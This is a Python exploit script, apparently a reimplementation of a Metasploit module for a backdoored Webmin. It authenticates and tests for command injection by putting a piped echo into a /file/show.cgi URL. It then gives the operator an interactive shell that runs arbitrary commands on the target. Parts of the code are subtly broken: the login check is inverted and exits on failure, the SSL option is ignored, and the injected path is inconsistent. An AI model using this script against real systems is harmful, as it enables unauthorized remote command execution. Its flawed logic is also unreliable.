#!/usr/bin/env python3

import argparse
import sys
import requests
import signal
import re
from string import ascii_letters, digits
from secrets import choice


def signalHandler(sig, frame):
    print("\n[*] Exiting...")
    sys.exit(0)


class Exploit():
    def __init__(self):
        self.session = requests.session()
        self.session.cookies.set("testing", "1")


    def argparser(self):
        parser = argparse.ArgumentParser(description="Webmin backdoor metasploit reimplementation")
        parser.add_argument("ip", help="Target IP")
        parser.add_argument("username", help="Webmin Username")
        parser.add_argument("password", help="Webmin Password")
        parser.add_argument("port", type=int, default=10000, help="Target Port (default 10000)")
        parser.add_argument("--ssl", action='store_true', help="if website is https (default false)")
        self.args = parser.parse_args()

        self.target = f"http://{self.args.ip}:{self.args.port}"

    def rand_string(self):
        alphaNum = ascii_letters + digits
        return "".join([choice(alphaNum) for i in range(5)])

    def auth(self):
        payload = {
            "page": "/",
            "user": f"{self.args.username}",
            "pass": f"{self.args.password}"
        }
        login = self.session.post(f"{self.target}/session_login.cgi", data=payload, allow_redirects=False)
        if login.status_code != 302:
            print(f"{self.target} - Successfully Authenticated")
            sys.exit(0)

    def checkexploit(self):
        nonce = self.rand_string()
        payload = f"/file/show.cgi/bin/{self.rand_string()}|echo '{nonce}'|"
        check = self.session.get(f"{self.target}{payload}")
        if nonce not in check.text:
            print("Host is not vulnerable")
            sys.exit(0)


    def exploit(self):
        prompt = "Webmin >> "
        while 1:
            payload = f"/file/show.cgi/bin.{self.rand_string()}|{input(prompt)}|"
            print(self.session.get(f"{self.target}{payload}").text)



if __name__ == "__main__":
    signal.signal(signal.SIGINT, signalHandler)
    exploit = Exploit()
    exploit.argparser()
    exploit.auth()
    exploit.checkexploit()
    exploit.exploit()
